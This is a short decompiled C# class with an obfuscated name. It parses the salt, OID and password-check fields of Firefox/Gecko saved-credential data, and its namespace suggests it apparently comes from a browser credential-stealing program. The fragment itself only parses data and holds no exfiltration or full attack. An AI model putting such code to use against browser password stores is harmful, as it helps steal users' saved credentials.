using System;
using System.Globalization;

namespace NoiseMe.Drags.App.Data.Gecko
{
	// Token: 0x020001A0 RID: 416
	public class о6а
	{
		// Token: 0x17000345 RID: 837
		// (get) Token: 0x06000D21 RID: 3361 RVA: 0x00009BE5 File Offset: 0x00007DE5
		public string EntrySalt { get; }

		// Token: 0x17000346 RID: 838
		// (get) Token: 0x06000D22 RID: 3362 RVA: 0x00009BED File Offset: 0x00007DED
		public string OID { get; }

		// Token: 0x17000347 RID: 839
		// (get) Token: 0x06000D23 RID: 3363 RVA: 0x00009BF5 File Offset: 0x00007DF5
		public string Passwordcheck { get; }

		// Token: 0x06000D24 RID: 3364 RVA: 0x00029D08 File Offset: 0x00027F08
		public о6а(string DataToParse)
		{
			int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
			this.EntrySalt = DataToParse.Substring(6, num);
			int num2 = DataToParse.Length - (6 + num + 36);
			this.OID = DataToParse.Substring(6 + num + 36, num2);
			this.Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
		}
	}
}
